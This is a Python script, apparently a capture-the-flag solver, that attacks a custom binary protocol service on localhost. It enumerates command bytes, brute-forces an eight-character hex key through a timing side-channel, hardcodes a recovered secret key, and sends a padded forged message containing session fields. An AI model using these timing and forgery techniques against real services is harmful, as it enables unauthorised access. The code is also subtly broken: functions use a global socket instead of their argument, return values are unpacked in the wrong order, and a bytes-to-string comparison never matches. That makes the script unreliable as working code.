import socket
import struct
import time
import numpy as np

HOST = 'localhost'
PORT = 1337

class ServerError(Exception):
    def __init__(self, id: int, msg: str):
        self.id = id
        self.msg = msg

    def __str__(self):
        return f"Server return error {self.id} : {self.msg}"

def socket_read_n(sock, n):
    """ Read exactly n bytes from the socket.
        Raise RuntimeError if the connection closed before
        n bytes were read.
    """
    buf = b''
    while n > 0:
        data = sock.recv(n)
        if data == '':
            raise RuntimeError('unexpected connection close')
        buf += data
        n -= len(data)
    return buf

def receive(sock: socket.socket, meta: bool = False):
    msg_ok = socket_read_n(sock, 1)
    msg_type = socket_read_n(sock, 1)
    msg_len = struct.unpack('>I', socket_read_n(sock, 4))[0]
    msg = socket_read_n(s, msg_len-6)

    if msg_ok[0] == 0x00:
        raise ServerError(msg[0], msg[1:].decode())

    if meta:
        return msg_type, msg_len, msg
    else:
        return "", "", msg


def list_command(sock):
    for i in range(1,256):
        sock.send(struct.pack('>B', i))
        try:
            msg_type, msg_len, msg = receive(sock, meta=True)
            print(f"byte: {i} \t msg type: {msg_type} \t msg length: {msg_len} \t msg: {msg}")
        except ServerError as e:
            print(e)

def find_arg_length(s, command, max_length):
    for i in range(max_length):
        tosend = command
        for j in range(i):
            tosend += b'\x00'
        s.send(tosend)
        msg_len, msg_type, msg = receive(s)
        if msg_type != 4:
            print(f"length : {i} \t msg type: {msg_type} \t msg length: {msg_len} \t msg: {msg}")

def command_01(s, number):
    tosend = b'\x01'
    tosend += struct.pack('>I', number)
    
    s.send(tosend)
    msg_len, msg_type, msg = receive(s)
    print(f"msg length: {msg_len} \t msg: {int.to_bytes(msg_type,1,'big') + msg}")

def command_ac(s, key):

    tosend = b'\xac'
    tosend += key
    
    s.send(tosend)
    msg_len, msg_type, msg = receive(s)
    print(f"msg type: {msg_type} \t msg length: {msg_len} \t msg: {msg}")

def command_25(sock: socket.socket, key: bytes):
    sock.send(b'\x25' + key)
    msg_len, msg_type, msg = receive(s)
    print(f"msg type: {msg_type} \t msg length: {msg_len} \t msg: {msg}")

def command_25_brute_force(sock: socket.socket):
    l = "0123456789ABCDEF"
    key = ['0' for i in range(8)]
    for i in range(8):
        times = np.zeros(16)
        for _ in range(10):
            for index, k in enumerate(l):
                key[i] = k
                test_key = (''.join(key)).encode()
                start_time = time.time()
                command_25(s, test_key)
                times[index] += time.time() - start_time
            key[i] = l[times.argmax()]
    return key

def command_2a(s, data):
    s.send(b'\x2a' + data)
    msg_len, msg_type, msg = receive(s)
    print(f"msg type: {msg_type} \t msg length: {msg_len} \t msg: {msg}")

# Entrée : 5 octets
def command_40(s, data):
    s.send(b'\x40' + data)
    msg_len, msg_type, msg = receive(s)
    print(f"msg type: {msg_type} \t msg length: {msg_len} \t msg: {msg}")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))

    # command_25(s, b"0338D348")

    #command_2a(s, b'logdl 101732')

    # group=user

    header_size = b'\x00\x00\x00\x0c'
    msg_size = b'\x00\x00\x00\x39'
    unknown = b'\x00\x00\x00T'
    msg = b'epoch=1002011\nuuid=2667-285a-4d9e\ngroup=user\n'
    secret_key = b'D37AE50F'

    # log = "0|0|0|c|0|0|0|39|0|0|0|54|65|70|6f|63|68|3d|31|30|30|32|30|31|31|a|75|75|69|64|3d|32|36|36|37|2d|32|38|35|61|2d|34|64|39|65|a|67|72|6f|75|70|3d|75|73|65|72|a|44|33|37|41|45|35|30|46|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41|41"
    
    tosend = header_size + msg_size + unknown + msg + secret_key
    tosend += b'a' * (128 - len(tosend))

    print(tosend)
    command_ac(s, tosend)
